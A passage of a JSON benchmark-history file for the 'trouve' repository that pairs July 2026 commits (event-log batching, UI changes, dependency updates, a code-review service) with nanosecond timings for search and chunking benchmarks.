          "message": "Batch event-log appends through a dedicated writer thread (#97)\n\n* Batch event-log appends through a dedicated writer thread\n\nUnder many concurrent sessions, every streamed delta serialized on the\nStore's connection mutex with one fsync each. Slow drains backed up\nCodex turn routes until the shared stdout reader dropped them\n(ROUTE_CAPACITY overflow), failing otherwise-healthy turns with\n\"app-server event route closed before turn completed\".\n\nappend_event now queues to a single writer thread that commits all\npending appends in one transaction, then broadcasts and replies in\nqueue order. Callers keep the same blocking API and durability\nguarantee (return means committed), but no longer serialize each other,\nand the per-commit fsync amortizes across whatever queued under load.\nCursor/broadcast ordering now holds by construction: the writer thread\nis the sole author of both.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Apply rustfmt\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Test event writer failure handling\n\n---------\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-20T01:19:53-04:00",
          "tree_id": "70139812417b07b049e9b5cc06980f9c777e49bf",
          "url": "https://github.com/jimsimon/trouve/commit/070e408d5476ea86aa3be6b468d0b9775e2ab42f"
        },
        "date": 1784524911400,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 3829869.5,
            "range": "± 6164",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 28195.682343660355,
            "range": "± 17",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2217825.4130434785,
            "range": "± 838",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1233080.9076479077,
            "range": "± 3551",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "df740abafb47606d0a3e3266012e3eb5638bd09d",
          "message": "Lock file maintenance (#109)\n\n* Lock file maintenance\n\n* Pin plugin Node types for Bun declarations\n\n* Reconcile lockfiles with main\n\n---------\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>\nCo-authored-by: Codex <codex@openai.com>",
          "timestamp": "2026-07-20T02:14:00-04:00",
          "tree_id": "70139812417b07b049e9b5cc06980f9c777e49bf",
          "url": "https://github.com/jimsimon/trouve/commit/df740abafb47606d0a3e3266012e3eb5638bd09d"
        },
        "date": 1784528170599,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5128111.15,
            "range": "± 11835",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35581.55599400599,
            "range": "± 9",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2790797,
            "range": "± 913",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1532388.7729468597,
            "range": "± 17284",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "3fb0ac15fb655ba225c7c9c984776bca626e1a26",
          "message": "Promote settings to sidebar navigation (#104)",
          "timestamp": "2026-07-20T02:14:38-04:00",
          "tree_id": "6b545ecd061c92ab5ffc83f1374dba40885f3913",
          "url": "https://github.com/jimsimon/trouve/commit/3fb0ac15fb655ba225c7c9c984776bca626e1a26"
        },
        "date": 1784528303329,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4901906.611111111,
            "range": "± 11885",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36694.263548606636,
            "range": "± 8",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3026057.647058823,
            "range": "± 3901",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1404022.5754385965,
            "range": "± 7248",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "f54ff1648be4a8cec0881ec92a8302631f2f0a30",
          "message": "Defer chat tail pinning to avoid Slint instantiation chain (#77)\n\n* Defer Slint chat tail pinning\n\n* Share chat tail position calculation",
          "timestamp": "2026-07-20T02:37:25-04:00",
          "tree_id": "e42d57f1862ab299fadc0f539eb1fc8ca26e72cc",
          "url": "https://github.com/jimsimon/trouve/commit/f54ff1648be4a8cec0881ec92a8302631f2f0a30"
        },
        "date": 1784529570863,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4988349,
            "range": "± 7454",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37048.01104013648,
            "range": "± 11",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3094028.205882353,
            "range": "± 3804",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1379764.7454545456,
            "range": "± 10441",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "847e3b0d9f9a58058130902a4ded10ee9dec875c",
          "message": "Tighten pull request dashboard spacing (#110)",
          "timestamp": "2026-07-20T02:41:10-04:00",
          "tree_id": "6fbdc97272b5c79539dc28c40246cf5b7a092b12",
          "url": "https://github.com/jimsimon/trouve/commit/847e3b0d9f9a58058130902a4ded10ee9dec875c"
        },
        "date": 1784529793287,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5118636.388888889,
            "range": "± 11818",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35732.110996240604,
            "range": "± 6",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2797852.388888889,
            "range": "± 980",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1556239.0288420604,
            "range": "± 9248",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c612e43e0524956f36710bdd5f7bc92862b81351",
          "message": "Update Rust crate serde_json to v1.0.151 (#112)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-20T02:53:17-04:00",
          "tree_id": "78cc4ad9e30a121733d6b3f3346d10887f0cd4be",
          "url": "https://github.com/jimsimon/trouve/commit/c612e43e0524956f36710bdd5f7bc92862b81351"
        },
        "date": 1784530523552,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 3824115.041666667,
            "range": "± 6171",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 28156.70227963526,
            "range": "± 5",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2174254.195652174,
            "range": "± 674",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1223723.6753432495,
            "range": "± 8817",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c1ea35518dbaed65c6847782b71bdaeface9013e",
          "message": "Add workspace close action (#70)\n\n* Add workspace close action\n\nKeep sessions and worktrees intact when a workspace is closed, and reopen it when the same folder is registered again. Expose the lifecycle over the versioned protocol and consolidate workspace header actions into an overflow menu.\n\n* Address workspace close review feedback\n\nRefresh workspace state from server lifecycle events so multiple clients stay synchronized. Add HTTP coverage for closing, hiding, and reopening a workspace.\n\n* Update OpenAPI snapshot after rebase\n\n* Keep closed workspace state consistent\n\nReset all session-derived panels when closing the active workspace, resynchronize the home workspace for local and remote lifecycle changes, and reject new session or automation activity until a closed workspace is reopened.\n\n* Clear active session on remote workspace close\n\nShare the complete session-derived UI reset between direct and server-event workspace closure paths.",
          "timestamp": "2026-07-20T02:54:00-04:00",
          "tree_id": "a968832695f8a934e89c5cae8f632ce344edec20",
          "url": "https://github.com/jimsimon/trouve/commit/c1ea35518dbaed65c6847782b71bdaeface9013e"
        },
        "date": 1784530653700,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4835958.7,
            "range": "± 12192",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36734.318152218155,
            "range": "± 12",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3019246.382352941,
            "range": "± 1834",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1381183.1304938272,
            "range": "± 10901",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "71294e4e74f79c66902f4950f0c97ea811ba837e",
          "message": "Associate pull requests with session activity (#89)\n\n* Associate pull requests with session activity\n\n* Address pull request review feedback\n\n* Keep session pull requests scoped\n\nPreserve cross-branch PRs returned by the session-specific lookup across account dashboard refreshes, while limiting new associations to successful PR creation or remote-ref mutation activity. Read/list output and incidental mentions no longer associate unrelated PRs.",
          "timestamp": "2026-07-20T03:24:39-04:00",
          "tree_id": "42b87f40cb49b9ad3e61afc95e6352cacd8b2ff5",
          "url": "https://github.com/jimsimon/trouve/commit/71294e4e74f79c66902f4950f0c97ea811ba837e"
        },
        "date": 1784532411041,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5116138.333333334,
            "range": "± 11848",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35633.11759259259,
            "range": "± 7",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2811525.25,
            "range": "± 1084",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1572589.2328216373,
            "range": "± 10994",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "1b500c7f01034524913794dd76f78cc072ea5c89",
          "message": "Fix Spectacle image paste on Wayland (#113)\n\nEnable arboard's native Wayland data-control backend so KDE Spectacle screenshots are visible to every shared prompt input. Keep the existing X11 fallback for other Linux sessions.",
          "timestamp": "2026-07-20T03:29:01-04:00",
          "tree_id": "afca046f6107496a23323f594147ea841e922b6f",
          "url": "https://github.com/jimsimon/trouve/commit/1b500c7f01034524913794dd76f78cc072ea5c89"
        },
        "date": 1784532668846,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4972428.449999999,
            "range": "± 10170",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36684.132484567905,
            "range": "± 7",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2663844.1842105263,
            "range": "± 1950",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1591471.8237753883,
            "range": "± 7463",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "bbc3de26f5405f9ab5226f4c52186d4dba514623",
          "message": "Ignore retired events during replay (#111)",
          "timestamp": "2026-07-20T03:31:05-04:00",
          "tree_id": "820123733f7d7425eb034410035e705aa33d439c",
          "url": "https://github.com/jimsimon/trouve/commit/bbc3de26f5405f9ab5226f4c52186d4dba514623"
        },
        "date": 1784532794219,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 3801006.458333333,
            "range": "± 7974",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 27955.800675675677,
            "range": "± 51",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2162431.104166667,
            "range": "± 731",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1211917.0965367965,
            "range": "± 5573",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "038dbb602538285e939617e5d2858c7b7b684996",
          "message": "Show Codex reasoning summaries (#114)\n\n* Show Codex reasoning summaries\n\n* Deduplicate Codex reasoning parsing",
          "timestamp": "2026-07-20T04:04:09-04:00",
          "tree_id": "9b7806d3860680eb30559fab2c1eb84a75dfaf28",
          "url": "https://github.com/jimsimon/trouve/commit/038dbb602538285e939617e5d2858c7b7b684996"
        },
        "date": 1784534773003,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4868746.9,
            "range": "± 16886",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36479.076889421834,
            "range": "± 8",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2956435.8823529407,
            "range": "± 1512",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1377190.7665688433,
            "range": "± 5777",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "a921c6673de2cdff3cdda5e5c565b29f751d8022",
          "message": "Show subscription health in model picker (#84)\n\n* Show subscription health in model picker\n\n* Address subscription health review feedback\n\n* Harden subscription refresh and composer layout\n\n* Refresh subscriptions after batched turns",
          "timestamp": "2026-07-20T04:11:15-04:00",
          "tree_id": "d458660358b5a122dea88782c7e26e4f097c90c1",
          "url": "https://github.com/jimsimon/trouve/commit/a921c6673de2cdff3cdda5e5c565b29f751d8022"
        },
        "date": 1784535201245,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4895781.181818182,
            "range": "± 9437",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36656.40686550152,
            "range": "± 16",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3036923.970588235,
            "range": "± 1334",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1384565.8092105263,
            "range": "± 7695",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "870fb619685c05269140292c28f60ae668e44c57",
          "message": "Batch GitHub pull request reads with GraphQL (#119)\n\n* Batch GitHub pull request reads with GraphQL\n\nReplace the dashboard REST fan-out and branch lookups with GraphQL queries so the one-minute refresh stays within GitHub rate limits. Preserve structured server errors for empty client responses so refresh failures remain actionable.\n\n* Address GitHub refresh review findings",
          "timestamp": "2026-07-20T14:35:17-04:00",
          "tree_id": "2a487e2a9a9e98da142afa2189df5a5e00e6d84e",
          "url": "https://github.com/jimsimon/trouve/commit/870fb619685c05269140292c28f60ae668e44c57"
        },
        "date": 1784572649996,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 3851280.25,
            "range": "± 6561",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 28059.053362573097,
            "range": "± 45",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2167202.9347826084,
            "range": "± 650",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1280653.232388664,
            "range": "± 2332",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "71f0a74fc146b2a3b468252b759edf48ac4722e2",
          "message": "Show YOLO warning as permissions tooltip (#121)\n\n* Show YOLO warning as selector tooltip\n\n* Label YOLO warning for assistive technology",
          "timestamp": "2026-07-20T14:35:58-04:00",
          "tree_id": "0cf58bd86e71b8b5946b9d83a5f7a206ebd9ff47",
          "url": "https://github.com/jimsimon/trouve/commit/71f0a74fc146b2a3b468252b759edf48ac4722e2"
        },
        "date": 1784572780387,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5133037.25,
            "range": "± 8052",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35684.36644045219,
            "range": "± 6",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2814099.1944444445,
            "range": "± 957",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1457397.526340769,
            "range": "± 10460",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "06ca57180340a1318324ea9b1467d6e5ccafffde",
          "message": "Update all non-major dependencies (#126)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-20T14:52:54-04:00",
          "tree_id": "7595034bb3ceed3796cb986ce1a42281559bd1af",
          "url": "https://github.com/jimsimon/trouve/commit/06ca57180340a1318324ea9b1467d6e5ccafffde"
        },
        "date": 1784573794331,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5080711.6,
            "range": "± 6502",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35710.29727678571,
            "range": "± 8",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2811294.805555556,
            "range": "± 1297",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1539346.806862745,
            "range": "± 10433",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c542605c5413bb047fdc0e53f039bbcc6bd590c9",
          "message": "Cache GitHub PR details and refresh every 30 seconds (#134)\n\n* Cache GitHub dashboard details\n\n* Refresh PR dashboards every 30 seconds\n\nReplace manual PR refresh controls with a live freshness clock while the cached account feed updates both dashboard views automatically.\n\n* Bound GitHub dashboard refreshes\n\nElide the freshness status within the available header width and time out stalled per-host dashboard requests so they release the shared cache lock.",
          "timestamp": "2026-07-20T22:22:17-04:00",
          "tree_id": "9da5898c0c1667c51e0b5b46e9b9292b43e8e272",
          "url": "https://github.com/jimsimon/trouve/commit/c542605c5413bb047fdc0e53f039bbcc6bd590c9"
        },
        "date": 1784600761183,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4888331.1,
            "range": "± 8825",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36587.672750350146,
            "range": "± 12",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3033876.588235294,
            "range": "± 7451",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1419264.104807692,
            "range": "± 5717",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "aa113ce876066093acb00ab45e4c6c9f6c1f5eb6",
          "message": "Update Rust crate libc to v0.2.187 (#139)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-21T01:34:46-04:00",
          "tree_id": "56c10f753592fa8040d2c6479bf92e2b59dc3615",
          "url": "https://github.com/jimsimon/trouve/commit/aa113ce876066093acb00ab45e4c6c9f6c1f5eb6"
        },
        "date": 1784612216968,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 3798979.6785714286,
            "range": "± 5082",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 28494.615233616958,
            "range": "± 3",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2195169.270833333,
            "range": "± 9927",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1243644.521386637,
            "range": "± 3486",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "9bb2f698bb803c5ffd84a7a3ac6bbb0ce16a2a4f",
          "message": "Add GitHub App code review service (#145)\n\n* Add GitHub App code review service\n\n* Publish review service images to GHCR\n\n* Align container images with releases\n\n* Address code review feedback\n\n* Address follow-up review feedback\n\n* Clarify code review deployment setup\n\n* Fix parity CI dependency\n\n* Address terminal review cleanup feedback\n\n* Cancel superseded code reviews\n\n* Add multi-identity code reviews\n\nReview every changed file in bounded batches, run configurable native or custom focused identities, and validate and deduplicate findings before publishing.\n\n* Rename review identities to reviewers\n\nUse Reviewer Profile for configuration while presenting built-in and custom reviewers consistently across the API, dashboard, and documentation.\n\n* Add per-repository reviewer overrides\n\n* Address code review reliability feedback\n\n* Isolate code review reconciliation failures\n\n* Isolate review jobs and release publication\n\n* Track active code review turns\n\n* Serialize latest container publication",
          "timestamp": "2026-07-21T20:27:59-04:00",
          "tree_id": "f91365529b367dd640598322f82009add2319cd5",
          "url": "https://github.com/jimsimon/trouve/commit/9bb2f698bb803c5ffd84a7a3ac6bbb0ce16a2a4f"
        },
        "date": 1784680267871,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4212396.541666667,
            "range": "± 5489",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 25679.276165501164,
            "range": "± 5",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2199087.5217391304,
            "range": "± 3581",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 813893.4536519871,
            "range": "± 2505",
            "unit": "ns"
          }
        ]
      }
    ]
  }
}